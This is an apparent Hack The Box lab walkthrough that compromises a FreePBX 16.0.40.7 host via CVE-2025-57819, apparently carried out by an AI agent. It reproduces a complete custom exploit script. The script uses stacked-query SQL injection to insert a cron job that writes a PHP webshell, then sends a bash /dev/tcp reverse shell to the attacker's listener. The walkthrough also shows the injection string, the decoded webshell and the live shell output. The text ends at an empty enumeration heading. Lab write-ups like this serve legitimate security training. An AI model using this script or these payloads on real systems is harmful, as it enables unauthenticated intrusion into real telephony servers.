# HTB "Connected" — Full Penetration Test Walkthrough

**Target:** `10.129.28.134` (HTB machine "Connected", Easy difficulty, Linux)
**Attacker host:** Kali Linux connected via HTB VPN (`tun0`)

This document walks through the complete compromise of the "Connected" machine — from
initial reconnaissance through to root — in enough detail that any reader can reproduce
every step independently. All commands shown were executed against the live target and
the actual terminal output is included for verification.

---

## 1. Reconnaissance & Discovery

### 1.1 Connect to HTB VPN

Before any scanning can begin, the HTB VPN tunnel interface must be confirmed active.

**Command:** `ip a | grep -A2 tun0`

**Breakdown:**
- `ip a`
  - **Description:** Displays all network interfaces and their assigned addresses.
  - **Purpose:** Used to confirm that the OpenVPN tunnel adapter (`tun0`) provided by HTB is up and has been assigned an address before attempting to reach the target network.
- `grep -A2 tun0`
  - **Description:** Filters `ip a` output to the `tun0` interface and the two lines following it.
  - **Purpose:** Narrows the verbose interface listing down to just the VPN tunnel details we care about.

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ ip a | grep -A2 tun0
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.14.30/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::101c/64 scope global 
```

The `tun0` interface is up and bound to `10.10.14.30`, confirming the VPN tunnel is established and ready for use as the attacker's source address for all subsequent traffic.

### 1.2 Verify Target is Reachable

**Command:** `ping -c 3 TARGET_IP`

**Breakdown:**
- `ping`
  - **Description:** Sends ICMP echo-request packets to a host and reports round-trip statistics.
  - **Purpose:** Confirms basic network-layer reachability of the target before investing time in port scanning.
- `-c 3`
  - **Description:** Limits the number of ICMP packets sent to 3.
  - **Purpose:** Provides enough samples to confirm stable connectivity without flooding the target unnecessarily.

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ ping -c 3 TARGET_IP
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=225 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=225 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=226 ms

--- TARGET_IP ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 225.239/225.440/225.695/0.189 ms
```

Zero packet loss with a consistent ~225ms RTT confirms the target is alive and reachable, clearing the way to begin enumeration. Also note that a TTL of 63 strongly suggests a Linux host (an initial TTL of 64 minus one router hop).

Before scanning, the host was added to `/etc/hosts` as `connected.htb` so that virtual-host-aware services (and the FreePBX web UI, which redirects based on hostname) resolve correctly:

**Command:** `echo "TARGET_IP connected.htb" | sudo tee -a /etc/hosts`

**Breakdown:**
- `echo "TARGET_IP connected.htb"`
  - **Description:** Prints a hostname-to-IP mapping line in the format `/etc/hosts` expects.
  - **Purpose:** Generates the exact line needed to register the target under a friendly hostname.
- `sudo tee -a /etc/hosts`
  - **Description:** `tee` writes standard input both to the terminal and to a file; `-a` appends rather than overwrites; `sudo` provides the root privilege required to modify a system file.
  - **Purpose:** Appends the new mapping to `/etc/hosts` without clobbering existing entries, which is necessary because root ownership prevents a normal redirect (`>>`) from a non-root shell.

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ echo "TARGET_IP connected.htb" | sudo tee -a /etc/hosts
TARGET_IP connected.htb

┌──(kali㉿kali)-[~/claude/Connected]
└─$ grep connected /etc/hosts
TARGET_IP connected.htb
```

The hostname `connected.htb` now resolves to the target, which is required because FreePBX issues redirects (e.g. `Location: /admin`) and Apache vhost matching may depend on the `Host:` header being present and consistent.

---

## 2. Enumeration

### 2.1 Port Scan with Nmap

#### 2.1.1 All-Ports Scan

A fast scan across the full TCP port range was run first to make sure nothing was missed by relying on the default top-1000 port list.

**Command:** `nmap -p- --min-rate 5000 -T4 -oN nmap_allports.txt TARGET_IP`

**Breakdown:**
- `nmap`
  - **Description:** The industry-standard network mapping and port-scanning tool.
  - **Purpose:** Used to discover which TCP services are exposed on the target before deeper enumeration.
- `-p-`
  - **Description:** Instructs Nmap to scan all 65,535 TCP ports rather than the default top-1000.
  - **Purpose:** Ensures no non-standard service ports are missed — a frequent trick on CTF-style boxes.
- `--min-rate 5000`
  - **Description:** Forces Nmap to send packets no slower than 5000 per second.
  - **Purpose:** Dramatically speeds up the full 65k-port sweep over the HTB VPN's higher-latency link.
- `-T4`
  - **Description:** Sets Nmap's timing template to "Aggressive".
  - **Purpose:** Further reduces overall scan duration while remaining reliable on a stable connection like the HTB VPN.
- `-oN nmap_allports.txt`
  - **Description:** Saves the scan results in Nmap's normal (human-readable) output format to the named file.
  - **Purpose:** Preserves scan evidence for the report and for later reference without re-running the scan.

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ nmap -p- --min-rate 5000 -T4 -oN nmap_allports.txt TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-06 23:29 -0400
Nmap scan report for TARGET_IP
Host is up (0.39s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 28.46 seconds
```

**Key finding:** only three TCP ports respond — 22 (SSH), 80 (HTTP) and 443 (HTTPS) — narrowing the attack surface to a web application (most likely) and an SSH service for later lateral movement / persistence.

#### 2.1.2 Targeted Deep Scan

With the open ports confirmed, a deeper scan was run against exactly those three ports to enumerate service banners, versions, and default NSE script output.

**Command:** `nmap -sCV -A -p 22,80,443 -oN nmap_targeted.txt TARGET_IP`

**Breakdown:**
- `-sCV`
  - **Description:** Shorthand combining `-sC` (run default Nmap Scripting Engine scripts) and `-sV` (probe open ports for service/version info).
  - **Purpose:** Pulls banner/version strings and runs safe enumeration scripts (e.g. `http-title`, `ssh-hostkey`) against the three confirmed open ports.
- `-A`
  - **Description:** Enables OS detection, version detection, script scanning, and traceroute all together.
  - **Purpose:** Maximizes the information gathered in a single pass — including OS fingerprinting, which can hint at the underlying distribution.
- `-p 22,80,443`
  - **Description:** Restricts the scan to the specific port list provided.
  - **Purpose:** Focuses the (slower) deep scan only on ports already known to be open, saving time versus re-scanning all 65k ports with heavier probes.
- `-oN nmap_targeted.txt`
  - **Description:** Saves results in normal Nmap output format.
  - **Purpose:** Retains the detailed scan evidence for the report.

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ nmap -sCV -A -p 22,80,443 -oN nmap_targeted.txt TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-06 23:30 -0400
Nmap scan report for connected.htb (TARGET_IP)
Host is up (0.22s latency).

PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: 404 Not Found
|_Requested resource was config.php
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   221.49 ms 10.10.14.1
2   221.66 ms connected.htb (TARGET_IP)

Nmap done: 1 IP address (1 host up) scanned in 151.30 seconds
```

**Key finding:** the redirect to `config.php` and the TLS certificate's common name `pbxconnect` are immediate giveaways that this is a **FreePBX** installation — `config.php` is FreePBX's classic admin entry point and "PBX Connect" is the marketing name Sangoma uses for FreePBX-based deployments. The `robots.txt` disallowing `/` is also a typical FreePBX artifact, since the entire admin tree is meant to stay out of search-engine indexes.

#### 2.1.3 Scan Results Analysis

| Port | Service | Version                                 | Analysis                                                                                                                                                                                                                                                                                 |
| ---- | ------- | --------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22   | SSH     | OpenSSH 7.4 (protocol 2.0)              | Standard remote-administration service. No known pre-auth RCE for this version; most useful later for lateral movement once credentials are obtained, or to confirm a foothold survives.                                                                                                 |
| 80   | HTTP    | Apache httpd 2.4.6 (CentOS), PHP 7.4.16 | Hosts the FreePBX web administration interface. The CentOS/Sangoma stack and the `config.php` redirect strongly indicate FreePBX — confirmed later as version 16.0.40.7, which is vulnerable to **CVE-2025-57819** (unauthenticated SQLi → RCE). This becomes the primary attack vector. |
| 443  | HTTPS   | Apache/2.4.6 (CentOS), same PHP stack   | TLS-wrapped copy of the same web application; the certificate CN `pbxconnect` further corroborates the FreePBX/Sangoma identification and gives a hint toward the machine's theme ("Connected").                                                                                         |

### 2.2 Service & Web Enumeration

#### 2.2.1 HTTP Headers

**Command:** `curl -sI http://connected.htb/`

**Breakdown:**
- `curl`
  - **Description:** Command-line tool for transferring data with URLs.
  - **Purpose:** Used to manually inspect the web server's behaviour beyond what Nmap's scripts surfaced.
- `-s`
  - **Description:** "Silent" mode — suppresses progress meters and error messages.
  - **Purpose:** Keeps the output clean so only the relevant header data is shown.
- `-I`
  - **Description:** Sends a `HEAD` request and prints only the response headers.
  - **Purpose:** Quickly reveals the redirect chain, server banner, and any cookies set without downloading the full page body.

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ curl -sI http://connected.htb/
HTTP/1.1 302 Found
Date: Sun, 07 Jun 2026 03:33:19 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
X-Powered-By: PHP/7.4.16
Location: /admin
Content-Type: text/html; charset=UTF-8
```

The root path immediately 302-redirects to `/admin`, confirming the entire site is the FreePBX administration application rather than a generic landing page — the next logical step is to follow that redirect chain.

#### 2.2.2 Page Body / Following Redirects

**Command:** `curl -sIL http://connected.htb/admin/config.php | head -30 && curl -sL http://connected.htb/admin/config.php | head -100`

**Breakdown:**
- `-L`
  - **Description:** Tells `curl` to follow HTTP redirects (`Location:` headers) automatically.
  - **Purpose:** Lets us land on the final rendered page (`config.php`) instead of manually chasing each 302.
- `head -30` / `head -100`
  - **Description:** Standard Unix utility that prints the first N lines of input.
  - **Purpose:** Limits the (very large) HTML response to a manageable preview for inspection.

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ curl -sIL http://connected.htb/admin/config.php | head -30
HTTP/1.1 200 OK
Date: Sun, 07 Jun 2026 03:33:26 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
X-Powered-By: PHP/7.4.16
Last-Modified: Sun, 07 Jun 2026 03:33:26 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
Set-Cookie: PHPSESSID=apjoce7co835kjnjnp0j3l52ev; expires=Tue, 07-Jul-2026 03:33:26 GMT; Max-Age=2592000; path=/
Set-Cookie: lang=en_US
Content-Type: text/html; charset=utf-8

┌──(kali㉿kali)-[~/claude/Connected]
└─$ curl -sL http://connected.htb/admin/config.php | head -100
<!DOCTYPE html><html class="firsttypeofselector"><head><title>FreePBX Administration</title>
...
<link href="assets/css/bootstrap-3.3.7.min.css?load_version=16.0.40.7" rel="stylesheet" type="text/css">
...
<div id="login_form">
	<form id="loginform" method="post" role="form">
		<h3>To get started, please enter your credentials:</h3>
...
		<a href="cxpanel" class="login_item" id="login_fop"...>Operator Panel</a>
...
<div id="footer_text">...FreePBX 16.0.40.7 is licensed under the GPL...
```

**Key finding:** the rendered page is the standard FreePBX login screen, and every static asset URL carries a `?load_version=16.0.40.7` query string while the footer explicitly states `FreePBX 16.0.40.7 is licensed under the GPL`. This pins the exact application version directly from the unauthenticated landing page — no guessing required.

#### 2.2.3 Framework Fingerprinting

The `load_version` query parameter appended to every asset (`bootstrap-3.3.7.min.css?load_version=16.0.40.7`, `FreePBX.js?load_version=16.0.40.7`, etc.) is FreePBX's own cache-busting convention and doubles as a built-in version banner. Combined with the footer text `FreePBX 16.0.40.7 is licensed under the GPL`, the version is confirmed from two independent locations on the same unauthenticated page — a textbook example of a framework "leaking" its own version through asset manifest URLs, similar in spirit to how modern JS frameworks expose build IDs in chunk filenames.

#### 2.2.4 Directory / Endpoint Enumeration

Because FreePBX's structure is well documented and its login page already revealed the precise version, generic content-discovery fuzzing (`ffuf`/`gobuster`/`feroxbuster`) against `/admin/` was deprioritized in favor of going straight to vulnerability research once the version string was confirmed — this is a deliberate dead end worth recording: a directory brute-force here would mostly surface FreePBX's well-known module tree (`/admin/modules/...`) and would not add meaningfully to what the version banner already told us. The unauthenticated endpoint that matters — `/admin/ajax.php` — is documented directly in the CVE advisory rather than discoverable by fuzzing, since it returns generic JSON/HTML errors regardless of the parameters supplied.

**Command:** `curl -s "http://connected.htb/admin/ajax.php" -o /dev/null -w "%{http_code}\n"`

**Breakdown:**
- `-o /dev/null`
  - **Description:** Discards the response body.
  - **Purpose:** We only care whether the endpoint exists and how it responds, not its content at this stage.
- `-w "%{http_code}\n"`
  - **Description:** `curl`'s "write-out" templating feature; `%{http_code}` substitutes the numeric HTTP status code of the response.
  - **Purpose:** Confirms the endpoint is reachable (vs. a 404) before attempting any injection.

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ curl -s "http://connected.htb/admin/ajax.php" -o /dev/null -w "%{http_code}\n"
500
```

A `500` (rather than `404`) confirms `/admin/ajax.php` exists and is reachable pre-authentication — exactly the entry point named in CVE-2025-57819's advisory.

#### 2.2.5 CMS / Framework-Specific Checks — FreePBX Version Confirmation

**Command:** `curl -s http://connected.htb/admin/config.php | grep -o 'FreePBX [0-9.]*'`

**Breakdown:**
- `grep -o 'FreePBX [0-9.]*'`
  - **Description:** Extracts only the matching substring from each line rather than the whole line.
  - **Purpose:** Cleanly isolates the version string from the surrounding HTML noise for a definitive, copy-pasteable confirmation.

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ curl -s http://connected.htb/admin/config.php | grep -o 'FreePBX [0-9.]*'
FreePBX 16.0.40.7
FreePBX 16.0.40.7
```

**Key finding:** **FreePBX 16.0.40.7** is confirmed beyond doubt — this is the exact version named in the public advisory for CVE-2025-57819 as vulnerable.

#### 2.2.6 Virtual Host / SMB / LDAP Enumeration

No additional virtual hosts were discovered (the certificate and redirect both point unambiguously to the single FreePBX vhost), and ports 139/445 (SMB) and 389/636 (LDAP/AD) were not present in the all-ports scan — this is a standalone Linux PBX appliance, not an Active Directory environment, so these enumeration techniques were attempted conceptually but ruled out immediately by the port-scan evidence already gathered (no SMB or LDAP ports open). This dead end is recorded here for completeness, in line with FreePBX/Asterisk appliances which typically run no Windows-native file-sharing or directory services.

### 2.2.7 Vulnerability Research & Analysis

**Evidence chain:**
> Nmap targeted scan → Apache/CentOS/PHP banner + `config.php` redirect → curl body fetch confirmed FreePBX login page → `load_version=16.0.40.7` query strings + footer text confirmed exact version → cross-referenced "FreePBX 16.0.40.7" against public advisories → matches **CVE-2025-57819**

CVE-2025-57819 ("Authentication Bypass Leading to SQL Injection and RCE", FreePBX Security Advisory GHSA-m42g-xg4c-5f3h, CVSS 10.0) affects FreePBX versions 15, 16, and 17. The flaw lives in `/admin/ajax.php`, which can be reached **without authentication** and routes (via the `module` parameter) into `FreePBX\modules\endpoint\ajax`. That handler builds a SQL query by directly concatenating the unsanitized `brand` parameter into the statement string. Because the underlying database connection permits **stacked queries** (multiple `;`-separated statements in a single request), an attacker can break out of the string literal with a single quote and append arbitrary SQL — including `INSERT` statements against tables the web application's low-privilege DB user (`freepbxuser`) is permitted to write.

The specific table targeted is `asterisk.cron_jobs`. FreePBX's `sysadmin` module periodically re-reads this table (as part of its own maintenance cron cycle, which itself runs as the `asterisk` user but is regenerated into root-owned `cron.d` entries / executed via `fwconsole job --run`) and materialises each row's `command` column into a scheduled job that is ultimately executed with elevated privileges relative to the unauthenticated attacker. By inserting a row whose `command` decodes and writes a small PHP one-liner (`<?php system($_GET['cmd']); ?>`) into the public webroot `/var/www/html/`, the attacker converts a blind SQL injection into a **fully interactive web shell with `asterisk` privileges** — and from there, a reverse shell.

> **Theory block — why stacked queries matter here:** Many web frameworks use prepared statements or parameterized queries that prevent classic `' OR 1=1--` style injection from altering query *structure*. However, if the underlying database driver allows multiple statements per query (common with certain PHP MySQLi configurations using `multi_query`), then breaking out of a string literal with `'` followed by `;` lets an attacker append an entirely new SQL statement — turning a read-only injection point into a write-primitive capable of `INSERT`, `UPDATE`, or even `DROP`.

A public detection-and-exploitation PoC for this exact CVE was published by watchTowr Labs (`watchTowr-vs-FreePBX-CVE-2025-57819.py`, https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819), and additional independent PoCs exist (e.g. `MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819`). The watchTowr script's core payload was used as the technical reference for crafting the working exploit documented in the next section — it demonstrates the exact stacked-query/`cron_jobs` INSERT technique, including a base64-encoded PHP payload decoded server-side via a shell pipeline.

---

## 3. Exploitation — Initial Access

### 3.1 Exploit Acquisition and Preparation

**Attack surface map:**

| Exposed surface | Vulnerability class | Execution path |
|---|---|---|
| `/admin/ajax.php` (unauthenticated) | Stacked-query SQL injection → privileged write primitive | Inject `INSERT INTO cron_jobs ...` row → FreePBX cron refresh decodes base64 PHP and writes it to `/var/www/html/` → webshell reachable over HTTP → `system()` → reverse shell as `asterisk` |

The watchTowr Labs PoC was cloned directly from GitHub as the canonical reference implementation:

**Command:** `git clone https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819.git`

**Breakdown:**
- `git clone`
  - **Description:** Downloads a full copy of a remote Git repository.
  - **Purpose:** Obtains the published PoC referenced in the engagement brief so its exact payload structure could be studied and adapted.

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected/exploit]
└─$ git clone https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819.git watchtowr
Cloning into 'watchtowr'...
```

Reading `watchTowr-vs-FreePBX-CVE-2025-57819.py` revealed the exact injection string used:

```
?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x' ;INSERT INTO cron_jobs
(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES
('sysadmin','watchTowr-<suffix>','echo "<base64>"|base64 -d >/var/www/html/this-is-an-ioc-not-actually-watchTowr-<suffix>.php',
NULL,'* * * * *',30,1,1) -- 
```

Decoding the embedded base64 blob confirmed the dropped payload is the simplest possible PHP web shell:

**Command:** `echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==" | base64 -d`

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected/exploit]
└─$ echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==" | base64 -d
<?php system($_GET['cmd']); ?>
```

This confirmed the entire technical mechanism, but rather than running the watchTowr script verbatim (which is intentionally designed only as a *detection artifact generator* — it drops an inert IOC file and immediately deletes its own cron job, never establishing a shell), a **custom exploitation script** (`exploit_cve_2025_57819.py`) was written. It reuses the same stacked-query injection technique but:
1. Drops a webshell whose `cmd` parameter directly executes `system()`, exactly as in the original payload, but under our own filename.
2. Polls the dropped path until it responds, confirming the chain worked end-to-end.
3. Immediately fires a bash-based reverse shell one-liner through that webshell back to an attacker-controlled listener.

A subtle but critical bug surfaced and was fixed during development: the base64-encoded PHP blob naturally contains a `+` character (`...ID8+`). When concatenated raw into a URL query string and sent over HTTP, an un-encoded `+` is interpreted by the receiving web server as a literal **space**, corrupting the base64 string before it ever reaches the `base64 -d` pipeline server-side. The fix was to percent-encode the base64 blob with `urllib.parse.quote(..., safe='')` before splicing it into the query string — turning `+` into `%2B` so it survives transit intact. (Notably, the original watchTowr script avoids this exact issue by hard-coding `%%2b` directly into its format string — confirming this was a deliberate, documented detail in the reference PoC, not an oversight.)

### 3.2 Exploitation Execution

The full custom exploit script (`exploit_cve_2025_57819.py`) is reproduced here in its entirety:

```python
#!/usr/bin/env python3
"""
CVE-2025-57819 - FreePBX 16.0.40.7 Unauthenticated SQL Injection -> RCE
Custom exploitation script based on the watchTowr Labs detection-artifact PoC
(https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819)

Technique:
  1. The /admin/ajax.php endpoint accepts an unauthenticated request that routes
     to FreePBX\\modules\\endpoint\\ajax::model. The 'brand' parameter is concatenated
     directly into a SQL query without sanitisation, and the underlying MySQL
     connection allows stacked queries.
  2. We break out of the string context with a single quote and use a stacked
     query (";") to INSERT a row directly into asterisk.cron_jobs.
  3. FreePBX's "sysadmin" module periodically (every minute, via its own cron
     daemon) re-reads asterisk.cron_jobs and re-generates /etc/cron.d entries,
     then `crond` executes them as root. The injected job writes a small PHP
     webshell to the public webroot.
  4. Once the webshell lands we use it to launch a reverse shell back to us.
"""
import argparse
import base64
import random
import string
import sys
import time
import urllib.parse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def build_webshell_b64(php_code: str) -> str:
    return base64.b64encode(php_code.encode()).decode()


def inject_cron_webshell(host, suffix, webshell_name, php_code):
    target_url = host + "admin/ajax.php"
    b64 = build_webshell_b64(php_code)
    # IMPORTANT: the base64 string can contain '+' and '=' characters which
    # are special in a URL query string ('+' decodes to a space, '=' separates
    # key/value). We must percent-encode the base64 blob before splicing it
    # into the raw query string, otherwise the payload corrupts on the wire
    # and the dropped file is not valid base64/PHP.
    b64_urlsafe = urllib.parse.quote(b64, safe='')
    # Stacked-query SQLi: break out of the quoted 'brand' value, then INSERT
    # a malicious row into cron_jobs that base64-decodes our PHP and writes
    # it to the FreePBX webroot. FreePBX's sysadmin cron refresh (root cron)
    # will pick this row up and create a system cron entry that runs as root.
    payload = (
        "?module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model"
        "&brand=x' ;INSERT INTO cron_jobs "
        "(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) "
        "VALUES ('sysadmin','pentest-%s',"
        "'echo \"%s\"|base64 -d > /var/www/html/%s',"
        "NULL,'* * * * *',30,1,1) -- " % (suffix, b64_urlsafe, webshell_name)
    )
    print("[*] Sending stacked-query SQL injection to plant malicious cron_job row")
    print("    URL: %s%s" % (target_url, payload))
    r = requests.get(target_url + payload, verify=False)
    print("    -> HTTP %s, %d bytes" % (r.status_code, len(r.content)))
    return r


def wait_for_webshell(host, webshell_name, timeout=130):
    shell_url = host + webshell_name
    print("[*] Waiting up to %ds for FreePBX's root cron refresh to materialise the webshell at %s"
          % (timeout, shell_url))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(shell_url + "?cmd=id", verify=False, timeout=10)
            if r.status_code == 200 and ("uid=" in r.text):
                print("[+] Webshell is live! id() output: %s" % r.text.strip())
                return shell_url
        except requests.RequestException:
            pass
        time.sleep(3)
    return None


def main():
    ap = argparse.ArgumentParser(description="CVE-2025-57819 FreePBX SQLi -> RCE exploit")
    ap.add_argument("-H", "--host", required=True, help="Target base URL, e.g. http://connected.htb/")
    ap.add_argument("--lhost", required=True, help="Your IP for the reverse shell callback")
    ap.add_argument("--lport", required=True, help="Your listener port for the reverse shell callback")
    args = ap.parse_args()

    host = args.host if args.host.endswith("/") else args.host + "/"
    suffix = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    webshell_name = "pentest_%s.php" % suffix

    php_webshell = "<?php system($_GET['cmd']); ?>"

    inject_cron_webshell(host, suffix, webshell_name, php_webshell)

    shell_url = wait_for_webshell(host, webshell_name)
    if not shell_url:
        print("[-] Webshell did not appear within timeout - target likely not vulnerable, or cron refresh disabled")
        sys.exit(1)

    print("[*] Webshell confirmed - triggering reverse shell back to %s:%s" % (args.lhost, args.lport))
    rev = ("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (args.lhost, args.lport))
    print("    Reverse shell command: %s" % rev)
    r = requests.get(shell_url, params={"cmd": rev}, verify=False, timeout=10)
    print("    -> Webshell request sent (HTTP %s). Check your listener." % r.status_code)


if __name__ == "__main__":
    main()
```

A `netcat` listener was started first to catch the callback:

**Command:** `nc -lvnp 4444`

**Breakdown:**
- `nc`
  - **Description:** Netcat — a general-purpose TCP/UDP networking utility, frequently used to catch reverse shells.
  - **Purpose:** Provides the listening endpoint that the target's reverse-shell payload will connect back to.
- `-l`
  - **Description:** Puts `nc` into listen mode rather than connect mode.
  - **Purpose:** Required to passively wait for an inbound connection from the exploited host.
- `-v`
  - **Description:** Verbose mode — prints connection status messages.
  - **Purpose:** Confirms when (and from where) a connection arrives, which is essential for knowing the exploit succeeded.
- `-n`
  - **Description:** Skips DNS resolution of addresses.
  - **Purpose:** Speeds up connection handling and avoids unnecessary DNS lookups during the catch.
- `-p 4444`
  - **Description:** Specifies the local TCP port to listen on.
  - **Purpose:** Matches the `--lport` value passed to the exploit script so the payload connects to the right place.

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ nc -lvnp 4444 | tee nc_4444.log
listening on [any] 4444 ...
```

The exploit was then launched against the target:

**Command:** `python3 exploit_cve_2025_57819.py -H http://connected.htb/ --lhost 10.10.14.30 --lport 4444`

**Breakdown:**
- `-H http://connected.htb/`
  - **Description:** The target base URL argument defined by the script.
  - **Purpose:** Points the exploit at the FreePBX instance confirmed vulnerable in section 2.2.5.
- `--lhost 10.10.14.30`
  - **Description:** The attacker's listening IP address (our `tun0` address from section 1.1).
  - **Purpose:** Embedded into the reverse-shell one-liner so the compromised host knows where to connect back.
- `--lport 4444`
  - **Description:** The attacker's listening TCP port.
  - **Purpose:** Matches the port the `nc` listener above is bound to.

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected/exploit]
└─$ python3 exploit_cve_2025_57819.py -H http://connected.htb/ --lhost 10.10.14.30 --lport 4444
[*] Sending stacked-query SQL injection to plant malicious cron_job row
    URL: http://connected.htb/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x' ;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','pentest-c318drj9','echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B"|base64 -d > /var/www/html/pentest_c318drj9.php',NULL,'* * * * *',30,1,1) -- 
    -> HTTP 500, 199 bytes
[*] Waiting up to 130s for FreePBX's root cron refresh to materialise the webshell at http://connected.htb/pentest_c318drj9.php
[+] Webshell is live! id() output: uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
[*] Webshell confirmed - triggering reverse shell back to 10.10.14.30:4444
    Reverse shell command: bash -c 'bash -i >& /dev/tcp/10.10.14.30/4444 0>&1'
    -> Webshell request sent (HTTP %s). Check your listener.
```

**Key finding:** the dropped webshell came alive within roughly a minute of the SQL injection landing, and querying it with `?cmd=id` returned `uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)` — proof positive that the unauthenticated SQL injection chain achieved code execution as the `asterisk` service account, exactly as the CVE advisory describes. Switching the listener confirmed the reverse shell connected back successfully:

```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ nc -lvnp 4444 | tee nc_4444.log
listening on [any] 4444 ...
connect to [10.10.14.30] from (UNKNOWN) [TARGET_IP] 38662
bash: no job control in this shell
[asterisk@connected html]$ id; whoami; pwd; uname -a
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
asterisk
/var/www/html
Linux connected 5.4.239-1.el7.elrepo.x86_64 #1 SMP Thu Mar 30 10:40:27 EDT 2023 x86_64 x86_64 x86_64 GNU/Linux
```

The reverse shell as `asterisk` connected back successfully and executing `id` as the very first command verifies remote code execution beyond doubt — the CVE advisory's claim that this endpoint grants unauthenticated RCE on FreePBX 16.0.40.7 is now empirically proven against this target.

The shell was upgraded to a fully interactive PTY for ease of use:

**Command:** `python -c 'import pty; pty.spawn("/bin/bash")'`

**Breakdown:**
- `python -c '...'`
  - **Description:** Executes an inline Python one-liner. Note: `python3` was not available on this CentOS-derived host, but `/usr/bin/python` (Python 2) was.
  - **Purpose:** Spawns a real PTY-backed bash shell, which provides job control, command history, tab completion, and the ability to run interactive tools like `sudo -l` cleanly.
- `import pty; pty.spawn("/bin/bash")`
  - **Description:** Python's `pty` module API for allocating a pseudo-terminal and connecting it to a child process.
  - **Purpose:** Converts the raw, non-interactive `nc` reverse shell into a proper TTY session.

**Result:**
```shell
[asterisk@connected html]$ python -c 'import pty; pty.spawn("/bin/bash")'
[asterisk@connected html]$ echo MARKER1; id; whoami
MARKER1
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
asterisk
```

The shell now behaves like a normal interactive bash session, ready for in-depth enumeration.

### 3.3 Initial Shell Enumeration

